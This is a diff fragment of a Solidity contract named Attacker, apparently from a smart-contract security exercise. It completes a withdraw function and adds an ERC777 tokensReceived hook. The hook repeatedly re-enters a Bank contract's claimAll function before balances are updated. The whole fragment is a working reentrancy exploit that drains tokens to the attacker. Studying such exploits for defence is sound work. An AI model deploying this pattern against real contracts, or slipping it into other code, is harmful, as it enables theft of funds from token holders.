@@ -64,4 +64,27 @@ contract Attacker is AccessControl, IERC777Recipient {
     */
     function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
         ERC777 token = bank.token();
-        token.send(recipient, token.bal
+        token.send(recipient, token.balanceOf(address(this)), "");
+    }
+
+    /*
+        This is called when the Bank sends ERC777 tokens to this contract.
+        It allows us to re-enter the claimAll function before balances are updated.
+    */
+    function tokensReceived(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external override {
+        emit Recurse(depth);
+
+        // Perform reentrant call to claimAll before balance is updated
+        if (depth < max_depth) {
+            depth++;
+            bank.claimAll();
+        }
+    }
+}
